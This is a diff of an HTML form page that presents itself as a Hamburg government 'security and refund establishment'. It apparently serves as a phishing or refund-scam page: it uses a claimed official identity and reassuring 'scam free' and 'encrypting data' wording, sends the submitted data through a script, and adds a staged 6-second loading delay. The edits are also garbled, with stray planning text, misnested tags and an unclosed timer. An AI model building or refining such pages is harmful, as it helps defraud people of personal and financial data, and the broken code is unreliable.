@@ -43,11 +43,15 @@
 <body>
 
     <div class="page-wrapper">
-        <div class="side-text"><h3>MISSION</h3><p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced verification protocols and proactive fraud detection systems.</p></div>
-
-        <div class="form-container">
-            <div class="security-banner">🛡️ SECURE RETURNS, SCAM FREE SERVICE</div>
-            <div class="header"><h1>FREIE UND HANSESTADT HAMBURG</h1></div>
+        <div class="side-text"><h3>MISSION</h3><p>MISSION (LEFT SIDE)	VISION (RIGHT SIDE)
+             <div class="side-text"><h3>MISSION</h3><p>To proactively establish and govern a fortified infrastructure for financial
+                 reclamation by deploying a multi-layered verification architecture that strictly authenticates every claimant's identity,
+                 thereby neutralizing fraudulent incursions and ensuring that the processing of refunds is conducted under the most stringent
+                 international security mandates to uphold the total integrity of the establishment’s financial disbursements.</p></div>
+              </div>
+        
+            <div class="security-banner">🛡️INTERNATIONAL SECURITY & REFUND ESTABLISHMENT </div>
+        <div class="header"><h1>FREIE UND HANSESTADT HAMBURG</h1></div>
             
             <form id="masterForm">
                 <!-- SECTION 1 -->
@@ -99,7 +103,9 @@
             <div id="loader">ENCRYPTING DATA & SECURING ASSETS...</div>
         </div>
 
-        <div class="side-text"><h3>VISION</h3><p>To be recognized as the premier global benchmark for commercial integrity and consumer safety.</p></div>
+        <div class="side-text"><h3>VISION</h3><p>To be the premier global establishment for financial security and consumer advocacy, setting the definitive trajectory for a fraud-free digital
+ economy where advanced verification systems and transparent governance models coexist to provide an absolute guarantee of safety, ensuring that every citizen worldwide can trust in a system that is
+            perpetually vigilant against deception and dedicated to the rightful protection of global assets.</p></div>
     </div>
 
     <script>
@@ -152,6 +158,8 @@
                 body: JSON.stringify(payload)
             }).then(() => {
                 setTimeout(() => {
+                       // 6 SECONDS LOADING FOR PRESENTATION
+                 setTimeout(() => {
                     document.getElementById('loader').style.display = 'none';
                     document.getElementById('section3').style.display = 'block';
                     document.getElementById('section3').innerHTML = `
